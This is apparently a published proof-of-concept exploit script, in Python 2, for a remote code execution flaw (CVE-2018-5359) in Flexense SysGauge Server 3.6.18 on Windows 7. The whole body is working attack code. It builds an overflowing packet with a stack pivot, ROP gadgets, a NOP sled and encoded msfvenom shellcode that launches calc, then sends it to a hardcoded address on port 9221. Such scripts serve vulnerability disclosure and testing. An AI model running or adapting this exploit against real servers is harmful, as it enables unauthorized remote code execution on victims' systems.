# Title: Flexense Sysgauge Server Remote Code Execution
# Author: Alejandro Parodi
# Date: 2018-08-17
# Vendor Homepage: https://www.sysgauge.com
# Software Link: https://www.exploit-db.com/apps/435890d7f9df83ee332639eef4c1191a-sysgaugesrv_setup_v3.6.18.exe
# Version: v3.6.18
# Tested on: Windows 7 x86
# CVE: CVE-2018-5359
# References: 
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-5359

import socket
import struct

pkg_header = "\x75\x19\xba\xab"
pkg_part2  = "\x03\x00\x00\x00"
pkg_part3  = "\x01\x00\x00\x00"
pkg_loop_length  = struct.pack("<I", 0x400)
pkg_size   = struct.pack("<I", 0x400)
pkg_cmd = "A" * 128
eip = struct.pack("<I", 0x1001C6DE) # Stack Pivot: add esp, 658; ret
padding_to_align_push_esp_ret_gadget = "A" * 8
push_esp_ret_gadget = struct.pack("<I", 0x10066657) # Change execution to Stack: push esp, ret gadget

nopsleed = "\x90" * 100
# Shellcode generated with:
# msfvenom -a x86 --platform windows -p windows/exec cmd=calc EXITFUNC=thread -e x86/shikata_ga_nai -i 5 -b '\x00\xFF\x0A\x0D\x02' -f python
# Shellcode Size: 324 bytes
shellcode  = "\xdd\xc7\xbf\x27\x3e\xe2\x54\xd9\x74\x24\xf4\x5b\x31"
shellcode += "\xc9\xb1\x4b\x31\x7b\x18\x83\xeb\xfc\x03\x7b\x33\xdc"
shellcode += "\x17\x8f\xfd\xf9\xac\x14\xf5\x42\x7a\x24\x1c\x79\xdd"
shellcode += "\xf5\x17\xcf\xa6\xc8\xe1\x29\x24\x6d\xf4\xca\xc4\x8d"
shellcode += "\xd2\x49\x4b\xd3\x39\x06\x3f\xb0\x61\xe8\x50\xfe\x8f"
shellcode += "\xc2\x97\x77\xc8\xe3\xe0\xdd\x84\x07\xca\xae\xb7\xf4"
shellcode += "\x6b\xbc\x5b\x4d\x1b\x88\x8e\xa7\xb6\x0f\xf7\xaf\x08"
shellcode += "\x52\x83\x3b\x10\xcf\xe5\xa3\xe8\xb8\x6e\xa3\x32\x3c"
shellcode += "\x26\x0c\x8b\xc6\x3e\xe1\x65\x58\xfc\x14\x89\x01\x4e"
shellcode += "\xee\xcb\xf9\xf7\x8b\xc1\x5e\x01\x39\x90\xe4\xf1\x80"
shellcode += "\xeb\xbf\x67\x39\xe0\x35\xb2\x79\xdc\x45\x94\xc0\x28"
shellcode += "\x43\x11\x87\xcc\x5b\x3d\x69\x8d\x6a\x94\x27\x7e\x62"
shellcode += "\x15\x86\x92\x0e\x6f\xfe\x5e\x24\x1e\xa6\xc9\xd4\x37"
shellcode += "\x84\x69\x8c\x97\xe5\x5d\xd6\xac\xd7\x08\xaf\x92\x39"
shellcode += "\x64\x78\x56\x06\xe1\x2f\x40\xd0\xb2\xa4\xd7\x81\x57"
shellcode += "\x8c\x12\x21\x3f\xc7\xcb\x46\x26\xcf\x94\x59\xb5\x73"
shellcode += "\xe3\xf3\x78\xf8\x6f\x13\xcf\x12\x11\xb9\x2a\x24\x24"
shellcode += "\x94\x99\x69\x1e\xae\xd3\x49\xd3\x40\xdd\xfe\xa7\x1c"
shellcode += "\xe0\xb8\x5f\xd3\x9f\x08\x85\x26\x08\x37\x88\x52\x33"
shellcode += "\xb2\x48\x89\x45\x5d\x99\xae\xab\x84\x56\xba\x08\xbc"
shellcode += "\xc3\x6f\x59\x3a\xba\xb9\x72\xbc\xa1\xa1\x5c\x1b\x48"
shellcode += "\x54\xce\x06\x23\x06\xc3\x1e\x2a\x3c\x75\x1b\x8e\x32"
shellcode += "\x87\x1c\x72\x71\xdd\x94\x7f\x41\x7b\xee\xed\x16\x2b"
shellcode += "\xdd\x3f\xab\x29\x36\xa9\x7c\x8e\xe3\x81\x55\x7a\x63"
shellcode += "\x3d\x13\x9f\x09\x8c\xbb\x37\xf0\xe1\x4e\x17\x40"

payload = nopsleed + shellcode

junk = "C"* (880 - len(payload))
pkg_flag_to_deserialize  = struct.pack("<I", ord(junk[-1])) # This flag is controlled by the last byte in the buffer
pkg_part8  = "\x32\x01\x44\x61"
pkg_part9  = "\x74\x61\x01\x30"
pkg_part10 = "\x01\x00\x00\x00"
pkg_part11 = "\x00\x00\x00\x00"

package = pkg_header + pkg_part2 + pkg_part3 + pkg_loop_length + pkg_size + pkg_flag_to_deserialize + pkg_cmd + eip + padding_to_align_push_esp_ret_gadget + push_esp_ret_gadget + payload + junk + pkg_part8 + pkg_part9 + pkg_part10 + pkg_part11 

ip = "192.168.0.23"
port = 9221
con = (ip, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(con)
s.sendall(package)

while True:
	print s.recv(1024)
